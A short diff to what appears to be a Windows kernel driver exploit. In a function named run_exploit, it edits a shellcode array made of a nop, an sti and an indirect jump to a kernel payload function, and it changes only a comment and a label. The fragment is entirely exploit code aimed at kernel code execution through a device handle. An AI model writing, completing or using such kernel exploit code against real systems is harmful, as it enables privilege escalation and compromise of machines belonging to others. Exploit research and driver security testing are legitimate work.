@@ -42,8 +42,7 @@ void run_exploit(HANDLE hDevice)
 	InBufferContents->Shellcode = {
 		{ 0x90, },                                  //      nop     ; for debugging
 		{ 0xfb, },                                  //      sti
-		{ 0xff, 0x25, 0x00, 0x00, 0x00, 0x00, },    //      jmp qword ptr [nextline]
-													// nextline:
+		{ 0xff, 0x25, 0x00, 0x00, 0x00, 0x00, },    //      jmp qword ptr [kernel_func]
 		&kernel_func                                //      dq KernelPayload
 	};
 
